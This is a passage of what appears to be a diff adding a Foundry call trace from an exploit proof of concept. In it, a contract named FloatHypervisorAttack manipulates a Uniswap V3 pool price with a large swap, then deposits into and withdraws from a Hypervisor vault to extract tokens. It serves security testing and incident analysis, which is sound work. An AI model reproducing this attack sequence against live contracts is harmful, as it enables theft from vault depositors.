+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 367856175105035777502879 [3.678e23]
+    │   │   │   │   │   │   │   └─ ← [Return] 367856175105035777502879 [3.678e23]
+    │   │   │   │   │   │   ├─ emit Swap(sender: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount0: 114000000000000000000000 [1.14e23], amount1: -12048651336097103662 [-1.204e19], sqrtPriceX96: 515162291880400541132445181 [5.151e26], liquidity: 1229269032441517314523 [1.229e21], tick: -100718 [-1.007e5])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 83: 0x010000000000000000006e35fd4975bc28c9700aeafff4d57aabcaab6a20f893 → 0x010000000000000000006fa21befc7d039ce24f298fff442ff03aeb76a954ac3
+    │   │   │   │   │   │   │   @ 0: 0x000166004c004c004afebe600000000000000000042c46fc3efd9284784e6f50 → 0x000166004c004c004bfe7692000000000000000001aa21dbcd4db719b52ed5fd
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb455: 0x0000000000000000000000000000000000036b274ff3aa5812039dad351adee8 → 0x0000000000000000000000000000000000308cae5f120079cf66b2d94e564b99
+    │   │   │   │   │   │   │   @ 3: 0x0000000000000000000000000000000100000000000000051cebd7b76da5f95a → 0x00000000000000000000000000000001000000000000000833f485b7b2e9f959
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb456: 0x01618c36b50000000000000000004c09bb3ca0e17ae4413bbdfffefa6054fb92 → 0x010909140e000000000000000000239860b326eebee9e3b6dbfff5489eaeb325
+    │   │   │   │   │   │   │   @ 4: 0x000000000000000000000000000000000000000000000042b466c21dce3330ec → 0x000000000000000000000000000000000000000000000042a388e80f20c611db
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb454: 0x000000000000000000000000000000002143c32a4678c897d7fdf74d9fa206ad → 0x0000000000000000000000000000000159b5924439e04ddeb231b96c8b1910ad
+    │   │   │   │   │   │   │   @ 1: 0x0000000000000000000000000000000171844d1b4e1002c2e9317f92555b726f → 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf
+    │   │   │   │   │   │   └─ ← [Return] 114000000000000000000000 [1.14e23], -12048651336097103662 [-1.204e19]
+    │   │   │   │   │   ├─ [275725] 0x3803729416AA5207FE801C1C565B906F6f3f8a28::deposit(2000000000000000000000 [2e21], 200000000000000000000 [2e20], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [44100] HypervisorA::getTotalAmounts() [staticcall]
+    │   │   │   │   │   │   │   ├─ [9013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000005966329d6cb9b4800000000000000000000000000000000cb0dd44fa2609544f64794b5927b1c75000000000000000000000000000000000019c14b24490ec819b0391ec234715400000000000000000000000000000000000000000000000004f27812fc6205bb0000000000000000000000000000000000000000000000000000b3db3d109716
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [9013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000b4776e4d6a183c900000000000000000000000000000000160f0896643bd8341cd9ddb519ad47b300000000000000000000000000000000000178c8bfc592c6c5827baecb6ffe3c0000000000000000000000000000000000000000000000000115bb76f910dd6600000000000000000000000000000000000000000000000000001287ef0ce6ea
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [3207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5180051764715447987753 [5.18e21]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 5180051764715447987753 [5.18e21]
+    │   │   │   │   │   │   │   ├─ [2534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1634862578394866656 [1.634e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 5211975150768176980114 [5.211e21], 1635080707639058912 [1.635e18]
+    │   │   │   │   │   │   ├─ [2389] HypervisorA::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2064504523257148120 [2.064e18]
+    │   │   │   │   │   │   ├─ [428] HypervisorA::token0() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9
+    │   │   │   │   │   │   ├─ [28762] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   │   ├─ [28010] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 2000000000000000000000 [2e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 115792089237316195423570985008687907853269984665640564037457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000014542ba12a337c00000 → 0x0000000000000000000000000000000000000000000000d8d726b7177a800000
+    │   │   │   │   │   │   │   │   │   @ 0xd49527dec3a22eb13bb9ca763ef992507c2d23d8da528a16db43ee590e72c2ff: 0 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   │   │   │   │   │   │   │   @ 0xd2a7dd510741a504147a01ed6e1711945381e597349bac81e11d0dc50ab19295: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffff93946ca47442bfffff
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [426] HypervisorA::token1() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   │   ├─ [25325] WETH9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 200000000000000000000 [2e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 200000000000000000000 [2e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x000000000000000000000000000000000000000000000036dcff16539d3a7f2e → 0x00000000000000000000000000000000000000000000002c057059f8d71a7f2e
+    │   │   │   │   │   │   │   │   @ 0xd6dd411d930935731dfdcdcdb0058fd113cef6fe4e16155161b4fc916de62fde: 0 → 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [134550] HypervisorA::deposit(2000000000000000000000 [2e21], 200000000000000000000 [2e20], 0x3803729416AA5207FE801C1C565B906F6f3f8a28)
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000005966329d6cb9b4800000000000000000000000000000000cb0dd44fa2609544f64794b5927b1c75000000000000000000000000000000000019c14b24490ec819b0391ec234715400000000000000000000000000000000000000000000000004f27812fc6205bb0000000000000000000000000000000000000000000000000000b3db3d109716
+    │   │   │   │   │   │   │   ├─ [20872] UniV3Pool::burn(-86640 [-8.664e4], -73800 [-7.38e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d56: 0x000000000000000000000000000000000019c14b24490ec819b0391ec2347154 → 0x00000000000000000000000000000000001b772bc722c39268bd934c39cea9bd
+    │   │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d55: 0x00000000000000000000000000000000cb0dd44fa2609544f64794b5927b1c75 → 0x00000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd17
+    │   │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000b3db3d109716000000000000000004f27812fc6205bb → 0x00000000000000000000bd69db7bb288000000000000000005d62a8fe7c6df28
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000b4776e4d6a183c900000000000000000000000000000000160f0896643bd8341cd9ddb519ad47b300000000000000000000000000000000000178c8bfc592c6c5827baecb6ffe3c0000000000000000000000000000000000000000000000000115bb76f910dd6600000000000000000000000000000000000000000000000000001287ef0ce6ea
+    │   │   │   │   │   │   │   ├─ [20872] UniV3Pool::burn(-86640 [-8.664e4], -80220 [-8.022e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f35919: 0x00000000000000000000000000000000000178c8bfc592c6c5827baecb6ffe3c → 0x0000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd7
+    │   │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x000000000000000000001287ef0ce6ea00000000000000000115bb76f910dd66 → 0x0000000000000000000019090cada3e8000000000000000002115937abba4184
+    │   │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f35918: 0x00000000000000000000000000000000160f0896643bd8341cd9ddb519ad47b3 → 0x000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d12
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000005966329d6cb9b4800000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001b772bc722c39268bd934c39cea9bd00000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd69db7bb288
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000b4776e4d6a183c9000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d120000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd700000000000000000000000000000000000000000000000002115937abba4184000000000000000000000000000000000000000000000000000019090cada3e8
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 5180051764715447987753 [5.18e21]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 5180051764715447987753 [5.18e21]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1634862578394866656 [1.634e18]
+    │   │   │   │   │   │   │   ├─ [14462] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(0x3803729416AA5207FE801C1C565B906F6f3f8a28, HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   │   │   ├─ [13710] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(0x3803729416AA5207FE801C1C565B906F6f3f8a28, HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], 2000000000000000000000 [2e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, to: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], amount: 2000000000000000000000 [2e21])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, spender: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], amount: 115792089237316195423570985008687907853269984665640564035371110590029246050172 [1.157e77])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xe807a091cafecc4e48f3fb2f6fb6e191cca64e2a0e89c2acdd2062d31834e8e6: 0xffffffffffffffffffffffffffffffffffffffffffffff8ee45d590b67f52f7c → 0xffffffffffffffffffffffffffffffffffffffffffffff2278c9fd7faab52f7c
+    │   │   │   │   │   │   │   │   │   │   @ 0xd49527dec3a22eb13bb9ca763ef992507c2d23d8da528a16db43ee590e72c2ff: 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xc4acc6036fca33b1d1cf4b03d2bfb475e13c8be5a95109648009df80c5e50873: 0x000000000000000000000000000000000000000000000118cfa8c2eb0f9d2e29 → 0x0000000000000000000000000000000000000000000001853b3c1e76ccdd2e29
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [8225] WETH9::transferFrom(0x3803729416AA5207FE801C1C565B906F6f3f8a28, HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], 200000000000000000000 [2e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, to: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], amount: 200000000000000000000 [2e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd6dd411d930935731dfdcdcdb0058fd113cef6fe4e16155161b4fc916de62fde: 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000 → 0
+    │   │   │   │   │   │   │   │   │   @ 0xbe2418a4c7634bc49aeab062e4fa8b7c6e86d01842dd0838fbedcb63e02edc4f: 0x00000000000000000000000000000000000000000000000016b032da69ce23e0 → 0x00000000000000000000000000000000000000000000000aee3eef352fee23e0
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 222628862475761717806 [2.226e20])
+    │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, param1: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, param2: 222628862475761717806 [2.226e20], param3: 2000000000000000000000 [2e21], param4: 200000000000000000000 [2e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000001ca697ecf9edf2d8 → 0x00000000000000000000000000000000000000000000000c2e3f32cf22ff8506
+    │   │   │   │   │   │   │   │   @ 0xb3631c0bf14c6edf120ce61b06277babfe37064155e1ac494d734c021bece83f: 0 → 0x00000000000000000000000000000000000000000000000c11989ae22911922e
+    │   │   │   │   │   │   │   └─ ← [Return] 222628862475761717806 [2.226e20]
+    │   │   │   │   │   │   ├─ [25247] HypervisorA::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 222628862475761717806 [2.226e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 222628862475761717806 [2.226e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0 → 0x00000000000000000000000000000000000000000000000c11989ae22911922e
+    │   │   │   │   │   │   │   │   @ 0xb3631c0bf14c6edf120ce61b06277babfe37064155e1ac494d734c021bece83f: 0x00000000000000000000000000000000000000000000000c11989ae22911922e → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] 222628862475761717806 [2.226e20]
+    │   │   │   │   │   ├─ [97902] HypervisorA::withdraw(222628862475761717806 [2.226e20], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000005966329d6cb9b4800000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001b772bc722c39268bd934c39cea9bd00000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd69db7bb288
+    │   │   │   │   │   │   ├─ [25654] UniV3Pool::burn(-86640 [-8.664e4], -73800 [-7.38e4], 398918952398671958 [3.989e17])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount: 398918952398671958 [3.989e17], amount0: 14377991540921446273 [1.437e19], amount1: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d54: 0x00000000000000000000000000000000000000000000000005966329d6cb9b48 → 0x000000000000000000000000000000000000000000000000000d247d62e6caf2
+    │   │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36451: 0xfffffffffffffffffa699cd6293464b8000000000000000005966329d6cb9b48 → 0xfffffffffffffffffff2db829d19350e0000000000000000000d247d62e6caf2
+    │   │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb453: 0x000000000000000010ddda0ead6d1f11000000000000000010ddda0ead6d1f11 → 0x00000000000000000b549b6239884ebb00000000000000000b549b6239884ebb
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000bd69db7bb288000000000000000005d62a8fe7c6df28 → 0x00000000000000000000bd69db7bb2880000000000000000cd5f0db0d3f88ea9
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000c788e320ec31af810000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [10272] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -86640 [-8.664e4], -73800 [-7.38e4], 14377991540921446273 [1.437e19], 0)
+    │   │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 14377991540921446273 [1.437e19])
+    │   │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 14377991540921446273 [1.437e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 14377991540921446273 [1.437e19])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000004de585f1207c0da66e9f → 0x000000000000000000000000000000000000000000004de4be683d5b2174bf1e
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000000d8d726b7177a800000 → 0x0000000000000000000000000000000000000000000000d99eaf9a3866b1af81
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount0: 14377991540921446273 [1.437e19], amount1: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000bd69db7bb2880000000000000000cd5f0db0d3f88ea9 → 0x00000000000000000000bd69db7bb288000000000000000005d62a8fe7c6df28
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000c788e320ec31af810000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000b4776e4d6a183c9000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d120000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd700000000000000000000000000000000000000000000000002115937abba4184000000000000000000000000000000000000000000000000000019090cada3e8
+    │   │   │   │   │   │   ├─ [22924] UniV3Pool::burn(-86640 [-8.664e4], -80220 [-8.022e4], 805281366236354458 [8.052e17])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount: 805281366236354458 [8.052e17], amount0: 16821418945836201021 [1.682e19], amount1: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x0000000000000000000019090cada3e8000000000000000002115937abba4184 → 0x0000000000000000000019090cada3e80000000000000000eb8308a00051f5c1
+    │   │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb453: 0x00000000000000000b549b6239884ebb00000000000000000b549b6239884ebb → 0x00000000000000000027ac3f66c5f72100000000000000000027ac3f66c5f721
+    │   │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deaf: 0xfffffffffffffffff4b8891b295e7c3700000000000000000b4776e4d6a183c9 → 0xffffffffffffffffffe5783dfc20d3d10000000000000000001a87c203df2c2f
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f35917: 0x0000000000000000000000000000000000000000000000000b4776e4d6a183c9 → 0x000000000000000000000000000000000000000000000000001a87c203df2c2f
